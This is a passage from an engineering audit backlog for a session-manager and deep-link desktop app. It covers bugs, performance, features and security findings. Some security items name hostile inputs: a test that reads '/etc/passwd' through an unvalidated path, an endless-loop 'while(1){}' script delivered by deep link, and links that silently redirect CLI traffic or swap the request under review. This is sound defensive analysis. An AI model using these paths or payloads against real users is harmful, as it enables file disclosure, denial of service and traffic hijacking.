- **Proposal:** (1) Backend stores each OS-delivered link as a pending request with a random nonce; the import command takes only the nonce. (2) Define `ccswitch://v2/import?p=<base64url JSON envelope>&sig=<ed25519>`: `{ v:2, items:[{resource, ...}], publisher?, minApp? }`, with a size cap (32 KB), a publisher key registry shipped with the app plus TOFU for unknown keys, and a clear "unsigned link" badge. (3) One dialog listing every item with per-item accept/reject, full details (SESS-02/07) and a "will switch active provider" warning when `enabled=true` (`deeplink/provider.rs:130-134`). (4) "Share as link" action on provider/MCP/prompt cards that emits v2 links (optionally stripping secrets), retiring `deplink.html` into `docs/`.
- **Acceptance:** Calling `import_from_deeplink_unified` with a fabricated request from devtools is rejected; a signed sample link verifies and shows the publisher name; a bundle of provider+MCP+prompt imports in one dialog; protocol spec document exists under `docs/`.

### SESS-11: Claude scanner lists `journal.jsonl` and other non-`agent-` files under `subagents/` as sessions

**Type:** bug · **Priority:** P2 · **Effort:** S · **Confidence:** medium

- **Evidence:** `src-tauri/src/session_manager/providers/claude.rs:268-286` recurses into every subdirectory of `~/.claude/projects` collecting all `*.jsonl`; the only exclusion is the filename prefix `agent-` (`claude.rs:255-260`). `src-tauri/src/services/session_usage.rs:115-120` documents that Claude Code Workflow writes `<session>/subagents/workflows/wf_<ID>/journal.jsonl` (test at `session_usage.rs:724-756`). `parse_session` falls back to the file stem as `session_id` (`claude.rs:226-227,262-266`) and always emits `resume_command = claude --resume {session_id}` (`claude.rs:251`).
- **Problem:** Each workflow run produces a bogus "journal" session with a non-working resume command (`claude --resume journal`), and future sidecar files (tool-results, snapshots) will leak into the list the same way.
- **Proposal:** Only treat `*.jsonl` directly under `projects/<project>/` as sessions; explicitly skip `subagents/`, `tool-results/` and any session sidecar directory; validate the inferred session id looks like a UUID before emitting a resume command.
- **Acceptance:** Unit test with a fixture tree containing `main.jsonl`, `main/subagents/agent-1.jsonl`, `main/subagents/workflows/wf_1/journal.jsonl` yields exactly one session.

### SESS-12: OpenCode/Hermes SQLite access has no busy timeout; sessions vanish and deletes fail while the tool is running

**Type:** bug · **Priority:** P2 · **Effort:** S · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/providers/opencode.rs:102-115` and `hermes.rs:60-66` open the tool's DB read-only and bail with an empty `Vec` on any error; `opencode.rs:401-419` and `hermes.rs:252-268` open read-write and run `DELETE` in an `unchecked_transaction` without `busy_timeout`. Compare `providers/codex.rs:147-155`, which sets a 2 s busy timeout precisely because "Codex keeps this DB open and write-locked while running; without a busy timeout a read during a write fails immediately and titles silently drop".
- **Problem:** With OpenCode/Hermes running, a refresh can intermittently return zero OpenCode sessions (the merge in `opencode.rs:38-62` then falls back to legacy JSON only) and deletion surfaces "database is locked".
- **Proposal:** Factor a `open_tool_db(path, mode)` helper that sets `busy_timeout(2s)` and `SQLITE_OPEN_NO_MUTEX`, use it in all three SQLite providers (and `services/session_usage_opencode.rs:85-87`), and log (not swallow) open/prepare errors.
- **Acceptance:** Test that holds a write lock on a temp DB from another connection while `scan_sessions_sqlite` runs and asserts rows are still returned; manual check with OpenCode open.

### SESS-13: `get_session_messages` and `load_messages_sqlite` accept arbitrary paths from the webview

**Type:** security · **Priority:** P2 · **Effort:** S · **Confidence:** high

- **Evidence:** `src-tauri/src/commands/session_manager.rs:13-25` passes `sourcePath` straight to `session_manager::load_messages` (`mod.rs:96-116`), which opens whatever path is given; `providers/opencode.rs:229-237` and `hermes.rs:188-196` open any SQLite file named in the `sqlite:` reference. By contrast `delete_session` canonicalizes and checks provider roots (`mod.rs:145-195`) and `delete_session_sqlite` compares against the expected DB path (`opencode.rs:385-399`).
- **Problem:** A compromised webview can read any JSONL/JSON/SQLite file on disk through the parsers (e.g. other apps' SQLite databases via the Hermes `SELECT role, content ...` path or any `messages` JSON via Gemini); inconsistent trust boundaries also make new providers easy to get wrong.
- **Proposal:** Reuse the root-validation path for reads (`resolve_session_source(provider_id, source) -> Result<ValidatedSource>`), validate `sqlite:` db paths against the provider's expected DB, and ideally resolve sessions by id from the index (SESS-09) instead of trusting paths.
- **Acceptance:** Rust test: `load_messages("claude", "/etc/passwd")` and `load_messages("hermes", "sqlite:/tmp/other.db#x")` return `Err("outside provider roots")`.

### SESS-14: Whole transcripts are loaded and shipped over IPC in one payload; scans parse entire JSON files

**Type:** performance · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/providers/claude.rs:32-86`, `codex.rs:204-269`, `openclaw.rs:77-123`, `hermes.rs:432-485` stream lines but accumulate every message into a `Vec<SessionMessage>` returned through `get_session_messages` (`commands/session_manager.rs:13-25`) and consumed as one query result (`src/lib/query/queries.ts:315-326`); `providers/gemini.rs:57-60,140-142` and `services/session_usage_gemini.rs:142-145` `read_to_string` + full `serde_json` parse per file; `opencode.rs:481-530` reads every message JSON and part file for untitled sessions during the list scan. `session-manager.md:107-109` (FR-8) asks for paging/streaming.
- **Problem:** A multi-hundred-MB Claude session produces a comparable JSON IPC payload and JS heap spike (the virtualizer only helps rendering); the TOC `useMemo` (`SessionManagerPage.tsx:366-384`) walks all messages; large Gemini chat files are re-parsed on every refresh.
- **Proposal:** Add `offset/limit` (or cursor by byte offset) to `get_session_messages` with a per-message content cap (e.g. 64 KB with "load full" on demand), a hard upper bound on total payload per call (e.g. 8 MB), and serve the TOC from a lightweight `list_session_turns` command; for Gemini scans read only the top-level fields with a streaming parser or cache by (path, mtime).
- **Acceptance:** Opening a synthetic 300 MB session shows the first page in <500 ms and memory stays flat; Gemini scan with 500×5 MB files completes in <1 s warm.

### SESS-15: Resume-in-terminal is macOS-only although Settings offer Windows/Linux terminals

**Type:** feature · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/terminal/mod.rs:13-15` returns "Terminal resume is only supported on macOS"; `src/components/sessions/SessionManagerPage.tsx:1521-1548` hides the button unless `isMac()`, and `:418-427` has an unreachable non-mac clipboard branch. Yet `src/components/settings/TerminalSettings.tsx:12-45` lets users pick `cmd`/`powershell`/`wt` and `gnome-terminal`/`konsole`/`xfce4-terminal`/`alacritty`/`kitty`/`ghostty`, and `preferred_terminal` has no other Rust consumer (`src-tauri/src/settings.rs:1092-1101`; `commands/session_manager.rs:38-45`). `session-manager.md:151-154` planned `TerminalLauncherWindows/Linux`.
- **Problem:** Windows/Linux users (the majority of Claude Code users) can only copy the command; the settings UI promises a terminal choice that nothing honours.
- **Proposal:** Implement a `TerminalLauncher` trait with `MacLauncher`, `WindowsLauncher` (`wt.exe -d <cwd> -- <program> <args>`, `powershell -NoExit -Command`, `cmd /K`) and `LinuxLauncher` (`gnome-terminal --working-directory`, `konsole --workdir -e`, `xfce4-terminal --working-directory -x`, `alacritty --working-directory -e`, `kitty --directory`, `ghostty --working-directory -e`), all taking `ResumeSpec` (SESS-01); show the Resume button on every platform with clipboard fallback on failure.
- **Acceptance:** Per-OS unit tests of argv construction; manual verification on Windows 11 (wt/cmd/powershell) and Ubuntu (gnome-terminal/kitty).

### SESS-16: Search covers metadata only; no transcript full-text search or in-session find

**Type:** feature · **Priority:** P2 · **Effort:** L · **Confidence:** high

- **Evidence:** `src/hooks/useSessionSearch.ts:27-48` indexes `sessionId,title,summary,projectDir,sourcePath` with FlexSearch `tokenize: "full"` and rebuilds the index on every `sessions` change; the message pane reuses the *list* query for highlighting (`SessionManagerPage.tsx:1675`, `SessionMessageItem.tsx:40-48,89-93`) so there is no dedicated find/next/prev inside a transcript. `session-manager.md:87-90` (FR-5 transcript search) and `:99-105` (FR-7 in-session search + highlight) require both.
- **Problem:** Users cannot answer "which session discussed X" (the PRD's top scenario) and the current highlight is confusing because it reflects the list query, not a transcript query.
- **Proposal:** Backend FTS5 over transcripts built by the index service (SESS-09), opt-in per provider with redaction; `search_sessions(q)` returning hits with snippets and `(session, message_index)` anchors; a Ctrl/Cmd+F find bar in the detail pane with match count and navigation using the virtualizer's `scrollToIndex`; keep FlexSearch only for instant metadata filtering and move it off the main thread or debounce rebuilds.
- **Acceptance:** Searching a word that appears only inside a tool result returns that session and jumps to the message; find bar shows "3/12" and navigates.

### SESS-17: Cost and token usage per session are available in the DB but never surfaced in the Session Manager

**Type:** feature · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** Session syncs already persist `session_id` on each `proxy_request_logs` row: `src-tauri/src/services/session_usage.rs:478-512` (`msg.session_id`), `session_usage_codex.rs:568-575` (thread id), `session_usage_gemini.rs:194-201`, `session_usage_opencode.rs:116-118`; the Session Manager's `SessionMeta` (`session_manager/mod.rs:9-28`) has no cost/token fields and `SessionItem.tsx` shows only title and time.
- **Problem:** Users cannot see what a session cost or which sessions dominate spend, although the data join is a single `GROUP BY session_id`.
- **Proposal:** Add `get_session_usage_summary(provider_id, session_id)` (tokens in/out/cache, cost, request count, models) and a batch variant for the visible list; show a cost chip in `SessionItem`, a usage card in the detail header, and "sort by cost".
- **Acceptance:** A Claude session with synced usage shows the same total as the Usage Dashboard filtered by that `session_id`; sessions without usage show "—".

### SESS-23: Test gaps across session manager, terminal, deep links and usage events

**Type:** test · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/providers/utils.rs:157-177` tests only timestamps (no `read_head_tail_lines` cases); `terminal/mod.rs:327-382` has no injection/escaping tests; `src-tauri/src/deeplink/tests.rs:63-898` covers parsing and provider building but nothing for `import_mcp_from_deeplink`, `import_prompt_from_deeplink` (enable path), `import_skill_from_deeplink`, size limits or URL-decoding of `+`/`%2B`; `src-tauri/tests/deeplink_import.rs:10-86` only exercises Claude/Codex provider happy paths; `tests/components/SessionManagerPage.test.tsx:224-639` covers delete/grouping only (no resume/launchTerminal, TOC, collapse, search highlight); no tests for `usage_events.rs` or `useUsageEventBridge.ts` (the dashboard test mocks it, `tests/components/UsageDashboard.test.tsx:32-33`); `DeepLinkImportDialog.tsx` and the three confirmation components have no tests.
- **Problem:** The highest-risk behaviours (shell construction, live-config writes from links, event coalescing) are unprotected against regressions.
- **Proposal:** Add fixture-driven tests: long-last-line tail reads; escaping/argv tests per launcher; MCP import with/without `enabled`, duplicate ids, oversized config; prompt enable backup; skill directory handling; debounce coalescing (`notify_log_recorded` ×100 → 1 emit) with an injectable emitter; Vitest for `DeepLinkImportDialog` (merge + import + cancel) and `McpConfirmation` rendering args/env.
- **Acceptance:** Coverage report shows the listed modules above 80 % line coverage; CI runs the new suites.

### SESS-28: Usage ingestion re-reads whole files on every change (line offsets, multiple passes)

**Type:** performance · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** `src-tauri/src/services/session_usage.rs:198-213` iterates from the start of the file and skips lines `<= last_offset` (a line count, not a byte offset); `session_usage_codex.rs:402,408` adds two more full passes (`read_codex_session_identity` at `:100-122`, `codex_history_replay_boundary` at `:126-163`) before the main loop at `:422-586`; `session_usage_gemini.rs:142-145` reads and parses the entire JSON on each mtime change and relies on `INSERT OR IGNORE` for every message; the loop runs every 60 s (`lib.rs:1127-1132`).
- **Problem:** Cost per tick is O(total size of changed files), not O(appended bytes); an actively used 200 MB Claude session is re-read up to three times per minute.
- **Proposal:** Persist byte offset + a short prefix hash (or inode/size) in `session_log_sync`, `seek` to the offset and parse only the delta, falling back to a full re-read when the prefix check fails; cache the Codex identity/boundary per file; for Gemini keep a per-session `(message_count, lastUpdated)` watermark and only process new messages; replace polling with the watcher from SESS-09.
- **Acceptance:** Benchmark: appending 1 KB to a 100 MB JSONL costs <5 ms of parsing; sync-state table gains `byte_offset`/`prefix_hash` columns with a migration.

### SESS-35: Session-log usage rows are frozen at the first-seen streaming snapshot (Claude INSERT OR IGNORE across syncs; Gemini upsert is unreachable)

**Type:** bug · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** src-tauri/src/services/session_usage.rs:300-317 dedups snapshots of one message.id (stop_reason / larger output_tokens wins), but only among lines read in the current pass (lines <= last_offset are skipped at :211-213). :333-335 now imports rows with no stop_reason. :441 `should_skip_session_insert` returns early when the request_id exists, and :480 uses `INSERT OR IGNORE`. The periodic sync runs every 60 s (src-tauri/src/lib.rs:1094,1126-1135). session_usage_opencode.rs:237 already says in a comment that in-progress messages have only part of their tokens and that INSERT OR IGNORE cannot backfill them, so OpenCode skips them; Claude has no such guard. Gemini: session_usage_gemini.rs:263 also returns early on an existing request_id, so the `ON CONFLICT(request_id) DO UPDATE` at :309-322, meant for full re-reads carrying updated values, never runs.
- **Problem:** When a 60 s sync tick lands while Claude Code is streaming a reply, the snapshot written so far (e.g. output_tokens=1-26, no stop_reason) is inserted as `session:<msg_id>`. The final snapshot (e.g. 1349 output tokens) comes in the next pass and is ignored, so output cost is under-counted for good. Long agentic turns that span a tick are the most affected. The upsert written for Gemini has the same problem: it is dead code.
- **Proposal:** Make session inserts upserts that keep the best snapshot: `ON CONFLICT(request_id) DO UPDATE SET ... WHERE excluded.output_tokens > output_tokens OR (stop_reason now present)`. Change should_skip_session_insert so an existing request_id with data_source=session_* is updated, not skipped. Store a stop_reason/is_final column, or keep rows without stop_reason as provisional. Emit notify_log_recorded on updates too. Remove or fix the Gemini early return so its upsert can run.
- **Acceptance:** Unit test: sync a file containing a partial snapshot of msg_1, then append the final snapshot and sync again. proxy_request_logs then holds a single msg_1 row with the final output_tokens and recomputed cost. A matching Gemini test shows changed token counts being updated.
- **Verification:** **confirmed** — services/session_usage.rs:211 skips lines <= last_offset, so per-message.id dedup (:291-310) only sees the current pass; :441 `should_skip_session_insert` returns early because usage_stats.rs:357 returns true when the request_id exists, and :480 is `INSERT OR IGNORE`, so a partial snapshot imported mid-stream is never replaced by the final one. session_usage_opencode.rs:236-240 explicitly skips incomplete messages for this reason, but Claude has no such guard (the :333-335 comment even relaxes the gate to import rows that have no stop_reason). Gemini: session_usage_gemini.rs:263 returns early on an existing request_id, so the ON CONFLICT DO UPDATE at :300-322 cannot fire. The behaviour is real, but the impact is under-counted output-token statistics with no security or user-data loss, so P2 fits better than P1. (Origin: completeness-critic pass.)

### SESS-36: Usage sync cursor advances past a partially written last line and past rows that failed to insert

**Type:** bug · **Priority:** P2 · **Effort:** S · **Confidence:** medium

- **Evidence:** src-tauri/src/services/session_usage.rs:206-227: `line_offset += 1` happens before the line is read. `BufRead::lines()` returns a final line with no newline as Ok, so a half-flushed JSON line fails `serde_json::from_str` and is skipped with `continue`. :345-350 turns insert errors into `skipped += 1`, and :354 still stores `line_offset` as the new cursor. The Codex parser does the same (session_usage_codex.rs:422-428 increment and skip, :577-583 errors counted as skipped, :589 cursor saved). The Gemini count is saved unconditionally (session_usage_gemini.rs:212). OpenCode does this correctly: it deliberately leaves the cursor unchanged on errors (session_usage_opencode.rs:135-160).
- **Problem:** If a sync tick reads a transcript while the agent is halfway through appending a large line, or if an insert fails once (SQLITE_BUSY, lock contention with the proxy logger), the cursor still moves past that line. The next sync starts after it, so that usage is never imported and the user gets no error.
- **Proposal:** Track byte offsets and advance the cursor only to the end of the last complete line, i.e. one ending in '\n', that parsed and inserted successfully. Do not advance it on insert errors. Follow the OpenCode pattern: a has_errors flag that blocks update_sync_state. Optionally re-read the last N lines on each pass and rely on request_id idempotency.
- **Acceptance:** Test: write a file whose last line is truncated JSON with no newline and sync. Then complete the line and sync again; the row is imported. Test: inject an insert failure; the cursor does not advance and the next sync imports the row.
- **Verification:** added by completeness-critic pass (not independently re-verified)

### SESS-37: Deep-link usage scripts run auto-enabled in an unbounded QuickJS sandbox, and the confirmation never shows the code

**Type:** security · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** src-tauri/src/deeplink/provider.rs:246-255 decodes `usageScript` and sets `enabled = request.usage_enabled.unwrap_or(!code.is_empty())`, so any script in a link is enabled by default; `usageAutoInterval` is taken as-is (parser.rs:141-143). src-tauri/src/usage_script.rs:34-57 and :115-132 create `Runtime::new()`/`Context::full` and call `ctx.eval(script)` with no interrupt handler, no memory limit and no stack limit (grep finds no `set_interrupt_handler`/`set_memory_limit`). `timeout_secs` only bounds the HTTP request (:227). The eval runs inside an async fn on the Tauri runtime (services/provider/usage.rs:22). src/components/DeepLinkImportDialog.tsx:626-650 shows only an 'enabled' badge for the script, never its source.
- **Problem:** A shared provider link can carry a script such as `while(1){}` or one that allocates without limit, plus an auto-query interval. Each automatic or manual usage query then pins a runtime worker thread forever or exhausts memory, which hangs or crashes the app. The user cannot see this before importing, because the code is hidden and enabled by default.
- **Proposal:** Add a QuickJS interrupt handler with a deadline from `timeout`, `set_memory_limit` and `set_max_stack_size`, and run eval in spawn_blocking. Import usage scripts from deep links as disabled unless the user explicitly opts in. Show the decoded script (collapsible, monospace) and the auto-query interval in the confirmation dialog. Enforce a minimum auto interval.
- **Acceptance:** A usage script `while(true){}` returns a timeout error within `timeout` seconds and the app stays responsive. A deep link with usageScript imports with usage_script.enabled=false unless the user ticks a checkbox in the dialog. The dialog renders the script text.
- **Verification:** **partially-confirmed** — deeplink/provider.rs:255 sets `enabled = request.usage_enabled.unwrap_or(!code.is_empty())`. usage_script.rs:34-57/115-132 call Runtime::new/Context::full and ctx.eval synchronously inside an async fn, and grep finds no interrupt handler, memory limit or spawn_blocking, so `while(1){}` would pin an async worker. DeepLinkImportDialog.tsx:626-650 shows only an enabled/disabled badge, never the script. One part of the proposal is already in place: the frontend clamps the auto-query interval to at least 1 minute (src/lib/query/queries.ts:265). Exfiltration is also limited, because the request URL is checked same-origin against base_url (usage_script.rs validate_request_url). The impact is a user-confirmed local DoS/hang, which makes P2 more proportionate than P1. (Origin: completeness-critic pass.)

### SESS-38: Provider deep link with enabled=true immediately switches the live provider, and the confirmation dialog never says so

**Type:** security · **Priority:** P2 · **Effort:** S · **Confidence:** high

- **Evidence:** src-tauri/src/deeplink/provider.rs:130-134: `if merged_request.enabled.unwrap_or(false) { ProviderService::switch(...) }` rewrites the live Claude/Codex/Gemini config to the link's endpoint. parser.rs:130 reads `enabled` from the URL. src/components/DeepLinkImportDialog.tsx has no reference to `request.enabled` (grep for 'enabled' matches only usageEnabled at :637-646). The provider view shows name, endpoint and masked key (:391-405) with a single Import button.
- **Problem:** A link that looks like 'add a provider' actually makes it the active provider at once. From then on all CLI traffic, including source code in prompts, goes to the link author's endpoint, and the user had no indication or choice. This is separate from the prompt-file overwrite (SESS-07) and the cross-resource semantics (SESS-32): this is the provider path and how it is disclosed.
- **Proposal:** Show an explicit 'Switch to this provider after import' checkbox that reflects `enabled` but defaults to unchecked. Pass the user's choice, not the URL value, to the backend. Warn when the endpoint host differs from known provider presets.
- **Acceptance:** Opening `ccswitch://v1/import?resource=provider&...&enabled=true` shows the switch checkbox unchecked. Importing without ticking it leaves the current provider unchanged. Ticking it switches.
- **Verification:** added by completeness-critic pass (not independently re-verified)

### SESS-39: Deep-link dialog can swap the pending request under the user (stale merge result / new link while open or importing)

**Type:** security · **Priority:** P2 · **Effort:** S · **Confidence:** medium

- **Evidence:** src/components/DeepLinkImportDialog.tsx:51-76: every `deeplink-import` event calls `setRequest(...)` with no guard for an open dialog or a running import. For links carrying `config`, `setRequest(mergedRequest)` runs after `await deeplinkApi.mergeDeeplinkConfig`, so an older event can resolve last and overwrite a newer one. handleImport (:93-205) imports whatever `request` holds at click time, and after it finishes it calls `setIsOpen(false)`, which can also dismiss a newer request that arrived meanwhile without the user reviewing it.
- **Problem:** A web page can fire several ccswitch:// links in a row: a benign one first, then a different one shortly before the user clicks Import. The dialog content changes under the cursor, and an out-of-order merge result can show one payload while the state holds another. The user may approve something they did not review.
- **Proposal:** Give each incoming event a sequence id and drop stale merge results. While a dialog is open or importing, queue new requests and show them one at a time (or show 'another import request arrived'). Freeze the reviewed request when the dialog opens and import exactly that snapshot. Disable Import for about 1 s after the content changes.
- **Acceptance:** Test: emit event A with config (slow merge), then event B without config. The dialog ends on B and A's merge result is discarded. Emitting a new event while the dialog is open queues it and leaves the visible request unchanged.
- **Verification:** added by completeness-critic pass (not independently re-verified)

### SESS-40: Deleted Hermes/OpenCode sessions come back from their legacy JSONL/JSON copies; the Hermes scan silently caps at 500

**Type:** bug · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** src-tauri/src/session_manager/providers/hermes.rs:26-48 merges SQLite and JSONL sessions and keeps a JSONL entry whenever its id is not in SQLite. delete_session_sqlite (:233-270) deletes only the `messages`/`sessions` rows and ignores errors from the messages delete (`let _ = tx.execute(...)` at :260); it never removes `sessions/<id>.jsonl`. hermes.rs:84 `SELECT * FROM sessions ORDER BY rowid DESC LIMIT 500`. opencode.rs:37-61 uses the same merge, and delete_session_sqlite (opencode.rs:382-421) never touches the legacy `storage/session|message|part` files.
- **Problem:** Deleting a Hermes session that also has a JSONL transcript, or an OpenCode session migrated from JSON storage, removes the SQLite rows. On the next refresh the merge no longer finds the id in SQLite, so the JSONL/JSON copy appears again and the user sees the delete as having failed. For Hermes users with more than 500 sessions, older ones silently fall back to their JSONL entries (or vanish). Deleting those removes only the file and leaves invisible DB rows.
- **Proposal:** On SQLite delete, also delete the matching legacy JSONL/JSON artifacts (reusing the existing file-delete helpers with id verification), or have the scan hide JSONL ids that have a tombstone. Propagate the messages-delete error. Replace LIMIT 500 with pagination, or at least log and surface truncation.
- **Acceptance:** Test: a Hermes session present in both state.db and sessions/<id>.jsonl is deleted via its sqlite: source, and scan_sessions() no longer returns it. Same for OpenCode JSON+SQLite. With 600 Hermes sessions in SQLite, all 600 are listed or the UI shows a truncation notice.
- **Verification:** added by completeness-critic pass (not independently re-verified)

### SESS-41: Session deletion is permanent with no trash or undo

**Type:** feature · **Priority:** P2 · **Effort:** M · **Confidence:** high

- **Evidence:** Every provider deletes with `std::fs::remove_file`/`remove_dir_all` or SQL `DELETE`: claude.rs:103-118 (including the whole sidecar dir with subagents/tool-results), grokbuild.rs:127, gemini.rs:130, opencode.rs:342-376 and :408-415, hermes.rs:260-263 and :489. Batch delete (mod.rs:120-128, SessionManagerPage.tsx:475-487) can remove dozens of transcripts in one confirm. The success toast (mutations.ts:365-369) has no undo action.
- **Problem:** One mis-click in selection mode, or a stale selection, destroys conversation history that the source CLIs need for `--resume`, and it cannot be recovered. The backlog's 'archive' feature (SESS-18) is a different workflow and does not protect against accidental deletes.
- **Proposal:** Move file-based sessions to the OS trash (the `trash` crate) or to a cc-switch quarantine dir with a 30-day TTL. For SQLite providers, export the rows to a JSON file in the quarantine before deleting. Add an 'Undo' action to the delete toasts and a 'Recently deleted' view.
- **Acceptance:** After deleting a Claude session, the .jsonl and its sidecar dir are in the trash or quarantine. Clicking Undo within the toast restores them and the session reappears in the list with resume working.
- **Verification:** added by completeness-critic pass (not independently re-verified)

### SESS-18: Missing session lifecycle features: export, pin/favorites, tags, archive, fork, redaction

**Type:** feature · **Priority:** P3 · **Effort:** L · **Confidence:** high

- **Evidence:** `session-manager.md:258-266` lists pin, tags, fork, export Markdown/JSONL, archive as backlog; none exist in `src/components/sessions/SessionManagerPage.tsx` (only copy/resume/delete at `:1519-1612`) or `src-tauri/src/commands/session_manager.rs:1-85`. Transcripts render raw (`SessionMessageItem.tsx:89-93`) although `session-manager.md:162-170` (§7) requires an optional sensitive-info mask.
- **Problem:** Destructive delete is the only management action; users cannot keep notable sessions, share a transcript, or continue a session without mutating the original.
- **Proposal:** With the index (SESS-09): `pinned`, `tags`, `archived` columns and UI filters; `export_session(source, format: md|json|html)` using the existing normalized messages; "Fork" = copy the JSONL under a new UUID (Claude: rewrite `sessionId`/`uuid`/`parentUuid` chain; Codex: new `session_meta.id`) then resume; a redaction pass (regexes for `sk-ant-`, `sk-`, `ghp_`, AWS, JWT) applied on copy/export and optionally on display.
- **Acceptance:** Export of a fixture session produces deterministic Markdown; a forked Claude session resumes with `claude --resume <new-id>`; pins survive restart; redaction unit tests.

### SESS-19: Gemini/Claude title metadata edge cases (untrimmed `.project_root`, 160-char Gemini titles, string-only Gemini titles)

**Type:** bug · **Priority:** P3 · **Effort:** S · **Confidence:** medium

- **Evidence:** `src-tauri/src/session_manager/providers/gemini.rs:37-38` uses `read_to_string(".project_root")` without `trim()` as `project_dir` (which later feeds `cd "<dir>"` in `terminal/mod.rs:312`); `gemini.rs:150-159` truncates titles at 160 chars while every other provider uses `TITLE_MAX_CHARS = 80` (`utils.rs:9`) and only accepts string content (`as_str`) although `load_messages` (`gemini.rs:76-85`) handles array content; `claude.rs:200-209` only sees `custom-title` within the last 30 lines.
- **Problem:** Trailing newline in `.project_root` breaks `cd`, Gemini sessions with array content get no title, and renamed Claude sessions show the stale first-message title.
- **Proposal:** `trim()` the project root; reuse `extract_text` + `TITLE_MAX_CHARS` for Gemini; scan the whole file for `custom-title` with a cheap substring prefilter (ties into SESS-03).
- **Acceptance:** Unit tests for each case.

### SESS-20: Stringly-typed `source_path` with two incompatible `sqlite:` conventions

**Type:** tech-debt · **Priority:** P3 · **Effort:** M · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/providers/opencode.rs:83-94` encodes `sqlite:<db_path>:<ses_id>` and relies on `rfind(":ses_")`; `hermes.rs:135,272-281` encodes `sqlite:<db_path>#<id>`; `mod.rs:96-133` dispatches on `provider_id == ... && source_path.starts_with("sqlite:")`; the frontend builds keys from the string (`src/components/sessions/utils.ts:69-70`) and `deleteMany` echoes it back (`SessionManagerPage.tsx:479-484`).
- **Problem:** Every provider invents its own encoding, Windows paths with colons needed a special-case hack, and the frontend cannot reason about sources.
- **Proposal:** `#[serde(tag = "kind")] enum SessionSource { File { path }, Sqlite { db, id }, Dir { path } }` on `SessionMeta`, with a single validator (SESS-13) and a stable `session_key` string computed server-side.
- **Acceptance:** No `starts_with("sqlite:")` in `session_manager`; TypeScript `SessionMeta.source` is a discriminated union.

### SESS-21: Every refresh re-parses all sessions and rebuilds a substring FlexSearch index on the main thread

**Type:** performance · **Priority:** P3 · **Effort:** M · **Confidence:** high

- **Evidence:** `src-tauri/src/session_manager/mod.rs:58-94` has no cache; `providers/codex.rs:75-80` re-reads `session_index.jsonl` and the state DB each scan; `src/hooks/useSessionSearch.ts:27-48` creates a new `FlexSearch.Index({ tokenize: "full" })` and re-adds every session whenever `filteredByProvider` changes (every refetch and every provider filter switch); `queries.ts:307-312` sets `staleTime` to 30 s so window-focus refetches are frequent.
- **Problem:** With thousands of sessions the scan costs seconds of disk I/O and the `full` tokenizer allocates every substring of every title/path, blocking the UI on each refetch.
- **Proposal:** Short-term: memoize by `(path, mtime, size)` in a process-level `HashMap` and only re-parse changed files; use `tokenize: "forward"` and keep one index updated incrementally; long-term: SESS-09.
- **Acceptance:** Second `list_sessions` call on an unchanged tree performs zero file reads (test with a counting FS shim or by timing); profiler shows index rebuild <10 ms for 5k sessions.

### SESS-22: Skill deep link ignores `directory`, generator emits unsupported `skills_path`, repo/branch unvalidated

**Type:** bug · **Priority:** P3 · **Effort:** S · **Confidence:** high

- **Evidence:** `src-tauri/src/deeplink/parser.rs:322-345` parses `directory` but `deeplink/skill.rs:23-50` never uses it (it only saves a `SkillRepo{owner,name,branch,enabled:true}`); `deplink.html:599-609` and `:2112-2134` advertise `skills_path` and `directory`, neither of which affect the import; `SkillConfirmation.tsx:24-31` displays `directory` as if it mattered; repo validation is only `split('/').count() == 2` (`parser.rs:333-337`) and `branch` is unvalidated before being interpolated into `https://github.com/{owner}/{name}/archive/refs/heads/{branch}.zip` (`services/skill.rs:2218-2221`).
- **Problem:** Users expect a specific skill to be installed but only a repo source is added; malformed owner/branch values produce confusing download errors and misleading confirmation text.
- **Proposal:** Either implement `directory` (install that skill after fetching) or drop it from parser/UI/generator; validate `owner`, `name` (`^[A-Za-z0-9_.-]{1,100}$`) and `branch` (`^[A-Za-z0-9._/-]{1,255}$`, no `..`); make `enabled` default explicit in the dialog.
- **Acceptance:** Parser tests reject `repo=../x` and `branch=../../`; generator and parser accept the same parameter set (SESS-24 spec).

### SESS-24: Documentation gaps: stale PRD, no deep-link protocol spec, generator lives in repo root

**Type:** docs · **Priority:** P3 · **Effort:** S · **Confidence:** high

- **Evidence:** `session-manager.md:1-5` still scopes to "Codex / Claude Code, v1 macOS only" while the code supports seven providers, delete/batch delete and grouping; it is Chinese-only and not under `docs/`. The deep-link format exists only as examples in the 105 KB `deplink.html:334-609` (which drifts from `parser.rs`, see SESS-22) and in-code comments (`deeplink/parser.rs:11-14`); `README.md` references are not a normative spec.
- **Problem:** Contributors adding a provider or a link parameter have no reference for file formats, `source_path` conventions, resume commands, or the parameter contract, which is how `skills_path`/`directory` drifted.
- **Proposal:** Add `docs/session-manager.md` (per-provider storage layout, parsed fields, deletion side-effects, resume command, known quirks) and `docs/deeplink-protocol.md` (versioning, parameters per resource, encoding rules, size limits, security model), move `deplink.html` to `docs/tools/` or generate it from the spec, and mark the PRD as historical.
- **Acceptance:** Both docs exist, are linked from `CONTRIBUTING.md`, and the generator's parameter list is derived from or checked against the spec.

### SESS-25: Dead code and oversized component in the session/deep-link frontends and commands

**Type:** tech-debt · **Priority:** P3 · **Effort:** M · **Confidence:** high

- **Evidence:** `src/components/sessions/SessionManagerPage.tsx` is 1753 lines mixing selection state, grouping, batch delete, resume, rendering and the confirm dialog; `:421-427` is an unreachable non-mac branch (button hidden at `:1521`); `src/lib/api/deeplink.ts:78-80` (`parseDeeplink`) has no callers; `src-tauri/src/commands/deeplink.rs:25-42` keeps a legacy `import_from_deeplink`; `src-tauri/src/commands/session_manager.rs:18-19,33-35` clone arguments needlessly; `DeepLinkImportDialog.tsx:232-242` reimplements base64 decoding that `src/lib/utils/base64.ts` already provides (used by `McpConfirmation.tsx:4`).
- **Problem:** Hard to test and review; unused commands enlarge the IPC attack surface.
- **Proposal:** Split the page into `useSessionSelection`, `useSessionGroups`, `SessionListPane`, `SessionDetailPane`, `SessionDeleteDialog`; remove the unused commands and branches; reuse `decodeBase64Utf8`.
